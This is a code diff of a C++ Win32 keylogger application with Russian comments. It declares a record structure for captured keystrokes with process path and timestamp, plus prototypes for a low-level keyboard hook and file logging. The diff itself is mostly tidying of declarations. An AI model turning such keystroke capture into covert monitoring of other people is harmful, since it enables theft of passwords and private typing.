@@ -13,10 +13,8 @@
 #include <unordered_map>
 #include <shellapi.h>
 #include <psapi.h>
-
 #include <shlwapi.h>
 #include <cstdio>
-
 
 using namespace std;
 
@@ -25,22 +23,18 @@ using namespace std;
 
 #define OnClearedField	1
 #define OnClearedList	2
-#define OnSearch    	3
-#define OnReadFile		4
-#define OnLoadDatabase  5
-
-#define OnCreateFile	6
-#define OnRecordAction	7
-#define OnOpenFile  	8
+#define OnCreateFile	3
+#define OnRecordAction	4
+#define OnOpenFile  	5
 
 #define TextBufferSize	1000
 
 struct KeyloggerRecord {
-    DWORD processId;          // ID процесса
-    wstring processPath;       // Путь к запущенному процессу
-    wstring dateTime;          // Дата и время действия
-    int keyCode;              // Код клавиши
-    wstring keyChar;             // Символ клавиши
+    DWORD processId;            // ID процесса
+    wstring processPath;        // Путь к запущенному процессу
+    wstring dateTime;           // Дата и время действия
+    int keyCode;                // Код клавиши
+    wstring keyChar;            // Символ клавиши
 
     // Конструктор для инициализации значений
     KeyloggerRecord(DWORD pid = 0, wstring path = L"", wstring dt = L"", int code = 0, wstring key = L"")
@@ -48,8 +42,8 @@ struct KeyloggerRecord {
     }
 };
 
-vector<KeyloggerRecord> keyloggerRecords;  // Глобальный контейнер для хранения записей
-const char delimeter = ';';  // Разделитель для записи
+vector<KeyloggerRecord> keyloggerRecords;       // Глобальный массив для хранения записей типа KeyloggerRecord
+const char delimeter = ';';                     // Разделитель для записи
 
 bool fileOpened;								// Флаг открытия файла для записи
 bool isRecordStarted = false;					// Флаг начала записи действий в файл
@@ -71,31 +65,16 @@ HWND hwndFilePathLabel;                         // Указатель на виджет, отобража
 ATOM                MyRegisterClass(HINSTANCE hInstance);
 BOOL                InitInstance(HINSTANCE, int);
 LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
-INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
-
 void                MainWndAddMenues(HWND hwnd);
 void                MainWndAddWidgets(HWND hwnd);
-
-//void                SetOpenFileParams(HWND hwnd);
-
 void                DefineColumns(HWND hwndLV);
-
-
-//void LoadKeyloggerRecordsFromFile(HWND hWnd);
-void KeyloggerFilling(HWND hwndListView);
-
-BOOL SelectFolderDialog(HWND hwnd, char* folderPath);
-void CreateFileInSelectedFolder(HWND hwnd);
-void WriteToFileANSI(const KeyloggerRecord& record);
-
-//void LoadKeyloggerRecordsFromFile(HWND hwnd);
-
-wstring GetKeyStringFromCode(int keyCode);
-LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
-void SetKeyboardHook();
-void RemoveKeyboardHook();
-
-//std::wstring ANSIToWideString(const std::string& ansiStr);
-void OpenTextFile();
-void UpdateFilePathLabel();
-
+void                KeyloggerFilling(HWND hwndListView);
+BOOL                SelectFolderDialog(HWND hwnd, char* folderPath);
+void                CreateFileInSelectedFolder(HWND hwnd);
+void                WriteToFileANSI(const KeyloggerRecord& record);
+wstring             GetKeyStringFromCode(int keyCode);
+LRESULT CALLBACK    KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
+void                SetKeyboardHook();
+void                RemoveKeyboardHook();
+void                OpenTextFile();
+void                UpdateFilePathLabel();
